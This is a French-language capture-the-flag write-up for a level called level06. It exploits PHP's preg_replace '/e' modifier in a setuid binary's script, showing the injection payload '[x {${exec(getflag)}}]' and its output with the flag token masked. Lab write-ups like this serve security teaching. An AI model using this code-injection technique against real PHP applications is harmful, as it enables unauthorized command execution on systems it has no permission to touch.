# Level06

Premiere étape de recherche

	$ ls -la
	-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
	-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php

On trouve un script php et un binaire

	$ ./level06
	PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
	(Le binaire execute le script php et on dirait qu'il lui donne un arg)

	$ ./level06 coucou
	PHP Warning:  file_get_contents(coucou): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4
	(Il doit prendre un fichier en argument)

Le binaire execute le script php

```php
<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}
function x($y, $z) {
	// Lit un fichier et met le contenu dans une chaine
	$a = file_get_contents($y);
	// remplace des patterns par d'autre via des REGEX
	// le modifier "e" est la faille. il execute l'arg subsitution avec la fonction eval() qui execute une chaine comme un script php
	// http://www.murraypicton.com/archive/using-phps-preg_replace-with-the-e-modifier.php
	// si on construit une string compatible avec le pattern "/(\[x (.*)\])/e" il va l'executer
	// il execute "y(\"\\2\")" et utilise le resultat pour remplacer
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}
$r = x($argv[1], $argv[2]);
// affiche la chaine transformée
print $r;
?>
```

Le script contient une faille via le modifier "e" de la REGEX

Ce modifier execute l'arg subsitution avec la fonction eval() qui execute une chaine comme un script php

http://www.murraypicton.com/archive/using-phps-preg_replace-with-the-e-modifier.php

Example:

	preg_replace("/c/e", "exec('echo blabla')", "coucou")
	--->
	blablaoublablaou


On va devoir construire une chaine qui passe les REGEX du debut jusqu'au modifier e

	1er arg = "[x touslescaracteresici]"
	2eme arg = exec "y("(tous les caracteres ici)")"


	$ echo "[x exec(getflag)]" > /tmp/coucou

	$ ./level06 /tmp/coucou
	exec(getflag)

Il l'a affiché mais pas exec. Pour acceder a la valeur de la variable retournée par la fonction, nous devons utiliser la syntaxe {${function()}}
(https://www.php.net/manual/fr/language.types.string.php#language.types.string.parsing.complex)

	$ echo '[x {${exec(getflag)}}]' > /tmp/coucou

	$ ./level06 /tmp/coucou
	PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
	PHP Notice:  Undefined variable: Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXX in /home/user/level06/level06.php(4) : regexp code on line 1
